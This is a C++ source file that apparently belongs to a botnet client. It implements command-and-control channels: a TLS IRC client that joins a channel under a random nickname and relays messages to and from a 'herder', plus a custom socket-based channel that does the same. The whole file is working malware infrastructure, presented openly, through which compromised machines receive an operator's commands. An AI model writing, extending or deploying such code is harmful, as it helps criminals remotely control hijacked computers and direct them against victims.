#include "Environment.hpp"
#include "Channels.hpp"
#include "SecureSocket.hpp"
#include "Random.hpp"

using namespace Legit;
using namespace std;

IrcCommandChannel::IrcCommandChannel(string host, string port, string channel, string herder, string pem) :
    client_(nullptr),
    channel_(channel),
    herder_(herder)
{
    RandomGenerator rng;
    nick_ = rng.GetString(Legit::ALPHA_MIXED, 1) + rng.GetString(Legit::ALPHA_NUMERIC_MIXED, 15);
     
    client_ = make_unique<IrcClient>(make_unique<SecureSocket>(host, port, make_unique<CertStore>(pem, false)), nick_);

    while (!client_->ReceivedFirstPing())
    {
        client_->Receive();
    }
    client_->Send("JOIN " + channel + "\r\n");
}

IrcCommandChannel::~IrcCommandChannel()
{
    client_->Send("QUIT out\r\n");
}

void IrcCommandChannel::Send(string message)
{
    client_->Send("PRIVMSG " + herder_ + " :" + message + "\r\n");
}

string IrcCommandChannel::Receive()
{
    auto message = client_->Receive();
    if (message.command == "PRIVMSG")
    { 
        if (message.params[0] == channel_ || message.GetReturnName() == herder_)
            return message.params[1];
    }

    return "";
}

CustomCommandChannel::CustomCommandChannel(string host, string port, string pem) : 
    socket_(make_unique<SecureSocket>(host, port, make_unique<CertStore>(pem, false)))
{
    RandomGenerator rng;

    nick_ = rng.GetString(Legit::ALPHA_MIXED, 1) + rng.GetString(Legit::ALPHA_NUMERIC_MIXED, 15);
    socket_->Send(nick_ + "\r\n");
    while (Receive() != "OK")
    {
        nick_ = rng.GetString(Legit::ALPHA_MIXED, 1) + rng.GetString(Legit::ALPHA_NUMERIC_MIXED, 15);
        socket_->Send(nick_ + "\r\n");
    }
}

CustomCommandChannel::~CustomCommandChannel()
{

}

void CustomCommandChannel::Send(string message)
{
    socket_->Send(message + "\r\n");
}

string CustomCommandChannel::Receive()
{
    auto endline = remains_.find("\r\n");
    while (endline == string::npos)
    {
        char buffer[4096];
        memset(buffer, 0, sizeof(buffer));
        auto bytesRead = socket_->Receive(buffer, sizeof(buffer));
        if (bytesRead >= 0)
            remains_.append(buffer, bytesRead);
        else
            return "quit"; // Socket error
        endline = remains_.find("\r\n");
    }

    string result = remains_.substr(0, endline);
    remains_ = remains_.substr(endline + 2);

    return result; 
}

